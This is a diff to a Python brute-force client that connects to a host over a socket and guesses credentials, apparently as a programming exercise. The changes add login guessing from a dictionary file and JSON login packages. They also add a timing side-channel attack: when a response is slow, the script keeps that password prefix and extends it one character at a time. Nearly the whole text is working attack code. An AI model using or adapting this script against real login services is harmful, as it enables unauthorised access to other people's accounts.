@@ -1,7 +1,9 @@
 import itertools
 import socket
 import sys
-from string import ascii_lowercase, digits
+import json
+import time
+from string import ascii_lowercase, ascii_uppercase, digits
 
 
 class Remote:
@@ -9,8 +11,11 @@ class Remote:
         self.client_socket = socket.socket()
         self.limit = 1000000
         self.buffer = 1024
-        self.password = ''
         self.attempts = 0
+        self.lag = 0
+        self.max_lag = 0.1
+        self.msg = ''
+        self.login_pkg = {"login": '', "password": ' '}
 
     @staticmethod
     def argv():
@@ -27,13 +32,34 @@ class Remote:
                 sys.exit()
 
     @staticmethod
-    def generate():
+    def pass_library():
+        """Attempts passwords from dictionary with case substitution"""
+        file = open('passwords.txt', 'rt')
+        passwords = file.readlines()
+        file.close()
+        for password in passwords:
+            if not password.isdigit():
+                for attempt in itertools.product(
+                        *([letter.lower(), letter.upper()] for letter in password.strip("\n"))):
+                    yield "".join(attempt)
+            else:
+                yield password
+
+    @staticmethod
+    def login_library():
+        """Attempts login from dictionary with case substitution"""
+        file = open('logins.txt', 'rt')
+        logins = file.readlines()
+        file.close()
+        for login in logins:
+            yield login.strip('\n')
+
+    def generate(self, seed=''):
         """Generates passwords in sequence start from 'a'"""
-        pool = ascii_lowercase + digits
-        for length in range(1, 32):
-            for attempt in itertools.product(pool, repeat=length):
-                yield ''.join(attempt)
-            length += 1
+        pool = ascii_lowercase + ascii_uppercase + digits
+        while self.msg != 'Connection success!':
+            for char in pool:
+                yield seed + char
 
     def connect(self, address: tuple):
         """Connect to the host"""
@@ -43,24 +69,33 @@ class Remote:
         """Close the connection to the host"""
         self.client_socket.close()
 
-    def message(self, msg: str):
+    def send(self, pkg):
         """Sends a message (str) to the host and returns the response (str)"""
-        self.client_socket.send(msg.encode())
-        return self.client_socket.recv(self.buffer).decode()
+        start = time.perf_counter()
+        self.client_socket.send((json.dumps(pkg)).encode())
+        self.msg = json.loads(self.client_socket.recv(self.buffer).decode())['result']
+        end = time.perf_counter()
+        self.lag = end - start
 
-    def brute(self, source: itertools):
+    def brute(self):
         """Attempt brute force attacks. Returns the password or error. Takes """
+        login_source = self.login_library()
+        pass_source = self.generate()
         while self.attempts < self.limit:
-            self.password = next(source)
-            response = self.message(self.password)
-            if response == 'Connection success!':
-                return self.password
-            elif response == 'Wrong password!':
-                pass
-            elif response == 'Too many attempts':
-                return response
-            else:
-                continue
+
+            if (self.msg == '') or (self.msg == 'Wrong login!'):
+                self.login_pkg['login'] = next(login_source)
+                self.send(self.login_pkg)
+            elif self.msg == 'Wrong password!':
+                if self.lag <= self.max_lag:
+                    self.login_pkg['password'] = next(pass_source)
+                    self.send(self.login_pkg)
+                else:
+                    pass_source = self.generate(self.login_pkg['password'])
+                    self.login_pkg['password'] = next(pass_source)
+                    self.send(self.login_pkg)
+            elif self.msg == 'Connection success!':
+                return json.dumps(self.login_pkg)
 
 
 if __name__ == '__main__':
@@ -68,6 +103,5 @@ if __name__ == '__main__':
     terminal = Remote()
     host = terminal.argv()
     terminal.connect(host)
-    pass_iter = terminal.generate()
-    print(terminal.brute(pass_iter))
+    print(terminal.brute())
     terminal.disconnect()
